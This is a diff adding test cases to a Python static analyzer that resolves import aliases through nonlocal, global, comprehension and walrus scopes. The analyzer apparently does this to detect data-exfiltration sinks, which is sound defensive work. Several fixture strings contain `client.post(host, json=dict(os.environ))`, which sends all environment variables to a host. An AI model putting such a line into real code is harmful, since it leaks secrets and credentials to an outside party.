@@ -1363,6 +1363,25 @@ def test_python_relative_import_over_a_module_alias_drops_it(tmp_path: Path, reb
             "        initialize()\n        client.post(host, json=dict(os.environ))\n\n    middle(None)\n\nouter()\n",
             True,
         ),
+        # A comprehension's `for` target binds the comprehension's own scope, so `nonlocal` cannot
+        # reach it and this file does not compile; the flat map proved `outer`'s call anyway...
+        (
+            "import os\n\ndef outer():\n    [client for client in range(1)]\n\n    def middle():\n        def initialize():\n            nonlocal client\n            import requests as client\n\n"
+            "        initialize()\n\n    middle()\n    client.post(host, json=dict(os.environ))\n\nouter()\n",
+            False,
+        ),
+        # ...whereas a walrus inside the comprehension binds `outer` itself, so it is reached.
+        (
+            "import os\n\ndef outer():\n    [(client := c) for c in range(1)]\n\n    def middle():\n        def initialize():\n            nonlocal client\n            import requests as client\n\n"
+            "        initialize()\n\n    middle()\n    client.post(host, json=dict(os.environ))\n\nouter()\n",
+            True,
+        ),
+        # A name `outer` declares `global` is bound nowhere local, so it is no target either.
+        (
+            "import os\n\ndef outer():\n    global client\n    client = None\n\n    def middle():\n        def initialize():\n            nonlocal client\n            import requests as client\n\n"
+            "        initialize()\n\n    middle()\n    client.post(host, json=dict(os.environ))\n\nouter()\n",
+            False,
+        ),
         # A class body is visible to itself, so a call there reads its own import...
         ("import os\n\nclass C:\n    import requests as client\n    client.post(host, json=dict(os.environ))\n", True),
         # ...but a method skips the class namespace, so the same name there is unbound and the
@@ -1762,6 +1781,29 @@ def test_python_nonlocal_binds_the_nearest_enclosing_function_that_binds_the_nam
     assert scopes.resolved(middle.body[0]) == {"client": "requests"}
     assert scopes.resolved(binder) == {"client": "urllib3"}
     assert scopes.resolved(binder.body[0]) == {"client": "urllib3"}
+
+
+def test_python_nonlocal_ignores_binders_the_compiler_does_not_accept() -> None:
+    """A comprehension's `for` target and a `global`-declared name are not bindings `nonlocal` can reach.
+
+    CPython binds a comprehension target in the comprehension's own scope and a `global` name at
+    module level, so a `nonlocal` aimed at either fails to compile; the model must not resolve it
+    to `outer` and prove a sink in a file that cannot run. A walrus inside the comprehension does
+    bind the enclosing function, so that one still counts.
+    """
+    tree = ast.parse(
+        "def outer():\n    [client for client in x]\n    def initialize():\n        nonlocal client\n        import requests as client\n"
+        "def walrus():\n    [(client := c) for c in x]\n    def initialize():\n        nonlocal client\n        import requests as client\n"
+        "def declared():\n    global client\n    client = None\n    def initialize():\n        nonlocal client\n        import requests as client\n"
+    )
+    scopes = _collect_python_aliases(tree)
+    outer, walrus, declared = tree.body
+
+    assert scopes.resolved(outer) == {}
+    assert scopes.resolved(outer.body[1]) == {"client": "requests"}
+    assert scopes.resolved(walrus) == {"client": "requests"}
+    assert scopes.resolved(declared) == {}
+    assert scopes.resolved(declared.body[2]) == {"client": "requests"}
 
 
 def test_python_import_aliases_bound_in_a_class_body_are_visible_only_there() -> None:
